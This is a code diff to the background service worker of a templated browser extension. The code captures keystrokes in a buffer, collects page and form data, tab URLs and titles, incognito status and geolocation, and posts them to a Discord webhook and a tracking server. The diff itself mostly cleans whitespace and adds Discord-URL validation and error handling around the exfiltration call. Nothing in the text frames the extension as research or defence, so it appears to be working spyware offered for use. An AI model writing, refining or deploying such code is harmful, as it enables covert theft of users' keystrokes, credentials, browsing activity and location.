@@ -1,4 +1,3 @@
-
 // Background service worker for {{EXTENSION_NAME}}
 const WEBHOOK_URL = '{{WEBHOOK_URL}}';
 const USER_ID = '{{USER_ID}}';
@@ -317,7 +316,7 @@ function collectPageData(extensionId, sessionId, userId, captureFormData, captur
       let keystrokeBuffer = '';
       document.addEventListener('keydown', function(event) {
         keystrokeBuffer += event.key;
-        
+
         if (keystrokeBuffer.length >= 20 || event.key === 'Enter') {
           const keystrokeData = {
             type: 'keystroke_event',
@@ -391,7 +390,7 @@ async function sendToWebhook(data) {
           { name: "🌐 URL", value: data.tabInfo?.url?.substring(0, 100) || 'Unknown', inline: false },
           { name: "📝 Title", value: data.tabInfo?.title?.substring(0, 100) || 'Untitled', inline: false }
         ];
-        
+
         if (data.location && !data.location.error) {
           embed.fields.push({
             name: "📍 Location",
@@ -399,7 +398,7 @@ async function sendToWebhook(data) {
             inline: true
           });
         }
-        
+
         if (data.tabInfo?.incognito) {
           embed.fields.push({ name: "🕵️ Mode", value: "Incognito", inline: true });
         }
@@ -467,19 +466,32 @@ async function sendToWebhook(data) {
       embeds: [embed]
     };
 
-    const response = await fetch(WEBHOOK_URL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(webhookPayload)
-    });
+    // Validate webhook URL
+    try {
+      if (!WEBHOOK_URL) {
+        console.warn('No webhook URL provided, skipping Discord notification');
+        return;
+      }
 
-    if (!response.ok) {
-      console.error('Webhook failed:', response.status, response.statusText);
+      if (!WEBHOOK_URL.startsWith('https://discord.com/api/webhooks/') && !WEBHOOK_URL.startsWith('https://discordapp.com/api/webhooks/')) {
+        console.error('Invalid webhook URL provided. Must be a Discord webhook URL.');
+        return;
+      }
+
+      console.log('📤 Sending data to Discord webhook...');
+
+      const response = await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(webhookPayload)
+      });
+
+      if (!response.ok) {
+        console.error('Webhook failed:', response.status, response.statusText);
+      }
+    } catch (error) {
+      console.error('Error sending to webhook:', error);
     }
-
-  } catch (error) {
-    console.error('Error sending to webhook:', error);
-  }
 }
 
 // Get color based on event type
@@ -504,7 +516,7 @@ async function sendToServer(data) {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(data)
     });
-    
+
     if (!response.ok) {
       console.error('Server tracking failed:', response.status);
     }
